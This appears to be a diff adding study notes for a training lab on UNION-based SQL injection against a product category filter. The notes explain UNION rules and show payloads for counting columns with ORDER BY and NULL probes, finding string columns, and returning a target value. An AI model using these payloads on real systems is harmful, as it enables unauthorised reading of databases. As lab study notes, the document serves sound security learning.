@@ -1,0 +1,74 @@
+SQL injection - Product category filter
+
+Goals:
+1- Determine the number of columns returned by the query.
+2- Determine the data type of the columns
+3- Make the column that have a string data type retrieve 'RnmP0k'
+
+Background (UNION):
+
+table1     table2
+a | b      c | d
+-----      -----
+1 , 2      2 , 3
+3 , 4      4 , 5
+
+Query #1: SELECT a, b FROM table1
+1 , 2
+3 , 4
+
+Query #2: SELECT a, b FROM table1 UNION SELECT c, d FROM table2
+1 , 2
+3 , 4
+2 , 3
+4 , 5
+
+Rules:
+1- The number and the order of the columns must be the same in all queries.
+2- The data types must be compatible.
+
+
+Step #1: Determine the number of columns
+
+SQL injection attack (way #1):
+
+SELECT ? FROM table1 UNION SELECT NULL
+-error -> incorrect number of columns
+
+SELECT ? FROM table1 UNION SELECT NULL, NULL, ...   <--- until you find the correct number of columns 
+-200 response code -> correct number of columns
+
+SQL injection attack (way #2):
+
+SELECT a, b FROM tabile1 ORDER BY 3 <-- error means the number of columns equal to the number you order it subtracting 1
+
+Step #2: Determine the data type of the columns
+
+SELECT a, b, c FROM table1 UNION SELECT 'a', NULL, NULL
+SELECT a, b, c FROM table1 UNION SELECT NULL, 'a', NULL
+SELECT a, b, c FROM table1 UNION SELECT NULL, NULL, 'a'
+
+-> error -> column is not string data type
+-> no error (200 response) -> column is string data type
+
+Analysis:
+
+' ORDER BY 1--
+-> 3 columns -> column number 1 is not shown in the page
+
+'UNION SELECT NULL, NULL, NULL--
+
+SELECT a, b, c FROM products WHERE category=''
+
+SELECT a, b, c FROM products WHERE category=''UNION SELECT 'a', NULL, NULL--'
+-> column a is not string data type
+
+SELECT a, b, c FROM products WHERE category=''UNION SELECT NULL, 'a', NULL--'
+-> column b is string data type
+
+SELECT a, b, c FROM products WHERE category=''UNION SELECT NULL, NULL, 'a'--'
+-> column c is not string data type
+
+SELECT a, b, c FROM products WHERE category=''UNION SELECT NULL, 'RnmP0k', NULL--'
+
+Solved
